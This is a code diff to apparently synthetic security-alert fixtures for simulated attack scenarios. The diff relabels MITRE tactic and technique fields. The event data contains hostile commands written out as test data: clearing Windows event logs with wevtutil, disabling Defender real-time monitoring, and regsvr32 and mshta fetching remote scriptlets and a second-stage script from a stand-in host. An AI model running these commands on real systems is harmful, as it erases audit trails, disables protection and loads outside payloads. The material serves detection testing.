@@ -307,7 +307,7 @@ export function phishingToExfilEvents() {
         "crowdstrike.DetectId": "ldt:bf21870142a4e34a535af46f5b8bcfd7:1234567892",
         "crowdstrike.DetectDescription": "Unsigned DLL with high entropy (7.8) written to user Temp directory by PowerShell. File name mimics Windows system binary (svchost). Zero global prevalence. Consistent with payload dropper activity.",
         "crowdstrike.DetectName": "MaliciousDropperFileWrite",
-        "crowdstrike.Tactic": "Defense Evasion",
+        "crowdstrike.Tactic": "Stealth",
         "threat.tactic.id": "TA0005",
         "crowdstrike.Technique": "Obfuscated Files or Information",
         "threat.technique.id": "T1027",
@@ -1424,7 +1424,7 @@ export function ransomwareScenarioEvents() {
       id: "evt_08_log_clear", ts: T(121 * MIN),
       source: "sysmon", vendor: "Microsoft Sysmon", event_type: "process_create",
       hostname: server.hostname,
-      severity: "high", mitre_technique: "T1070.001",
+      severity: "high", mitre_technique: "T1685.005",
       process: {
         name: "cmd.exe", pid: 8841, parent_name: "PSEXESVC.exe", parent_pid: 3310,
         cmdline: "cmd.exe /c wevtutil cl Security & wevtutil cl System & wevtutil cl Application",
@@ -1451,7 +1451,7 @@ export function ransomwareScenarioEvents() {
       id: "evt_08b_audit_clear", ts: T(121 * MIN + 5_000),
       source: "ad", vendor: "Windows Security", event_type: "audit_log_cleared",
       hostname: "FS-CORP-01", user_email: "svc-backup@nexacorp.com",
-      severity: "high", mitre_technique: "T1070.001",
+      severity: "high", mitre_technique: "T1685.005",
       description: "Windows recorded Event 1102 on FS-CORP-01 — the Security audit log was cleared.",
       raw: {
         "event.code": "1102",
@@ -2990,7 +2990,7 @@ export function dcSyncScenarioEvents() {
       id: "evt_dc_03_av_disabled", ts: T(5 * MIN),
       source: "av", vendor: "Microsoft Defender Antivirus", event_type: "av_detection",
       hostname: dc01, user_email: adminEmail,
-      severity: "critical", mitre_technique: "T1562.001",
+      severity: "critical", mitre_technique: "T1685",
       description: `reg.exe set DisableRealtimeMonitoring=1 under HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender on ${dc01}.`,
       raw: {
         "event.provider": "Microsoft Defender Antivirus",
@@ -3338,7 +3338,7 @@ export function dcSyncScenarioEvents() {
       id: "evt_dc_10_logclear", ts: T(25 * MIN),
       source: "ad", vendor: "Windows Security", event_type: "audit_log_cleared",
       hostname: dc01, user_email: adminEmail,
-      severity: "critical", mitre_technique: "T1070.001",
+      severity: "critical", mitre_technique: "T1685.005",
       description: `it.admin cleared the Security event log on ${dc01} (Event 1102).`,
       raw: {
         "winlog.event_id": "1102",
@@ -4383,7 +4383,7 @@ export function ntlmRelayScenarioEvents() {
         "crowdstrike.DetectName": "CredentialTheft",
         "crowdstrike.Tactic": "Credential Access",
         "threat.tactic.id": "TA0006",
-        "crowdstrike.Technique": "LLMNR/NBT-NS Poisoning and SMB Relay",
+        "crowdstrike.Technique": "Name Resolution Poisoning and SMB Relay",
         "threat.technique.id": "T1557",
         "threat.technique.subtechnique.id": "T1557.001",
         "crowdstrike.SeverityName": "Critical",
@@ -5924,7 +5924,7 @@ export function lolBinsScenarioEvents() {
       id: "evt_lol_02_regsvr32", ts: T(4 * MIN),
       source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
       hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
-      severity: "critical", mitre_technique: "T1218.010", mitre_tactic: "Defense Evasion",
+      severity: "critical", mitre_technique: "T1218.010", mitre_tactic: "Stealth",
       description: "regsvr32.exe ran with /i:http://cdn-winupd.ru/tpl/upd.sct, loading a COM scriptlet from a remote URL.",
       process: {
         name: "regsvr32.exe", pid: 5512, path: "C:\\Windows\\System32\\regsvr32.exe",
@@ -5990,7 +5990,7 @@ export function lolBinsScenarioEvents() {
       id: "evt_lol_03_mshta", ts: T(7 * MIN),
       source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
       hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
-      severity: "critical", mitre_technique: "T1218.005", mitre_tactic: "Defense Evasion",
+      severity: "critical", mitre_technique: "T1218.005", mitre_tactic: "Stealth",
       description: "mshta.exe, spawned by regsvr32.exe, ran a VBScript that launched hidden PowerShell to fetch stage2.ps1 from cdn-winupd.ru.",
       process: {
         name: "mshta.exe", pid: 6100, path: "C:\\Windows\\System32\\mshta.exe",
@@ -6143,7 +6143,7 @@ export function lolBinsScenarioEvents() {
       id: "evt_lol_06_rundll32", ts: T(16 * MIN),
       source: "edr", vendor: "Microsoft Defender for Endpoint", event_type: "process_create",
       hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
-      severity: "critical", mitre_technique: "T1218.011", mitre_tactic: "Defense Evasion",
+      severity: "critical", mitre_technique: "T1218.011", mitre_tactic: "Stealth",
       description: "rundll32.exe loaded an unsigned DLL (srvhost.dll) from C:\\Users\\Public, calling its DllMain export directly.",
       process: {
         name: "rundll32.exe", pid: 7480, path: "C:\\Windows\\System32\\rundll32.exe",
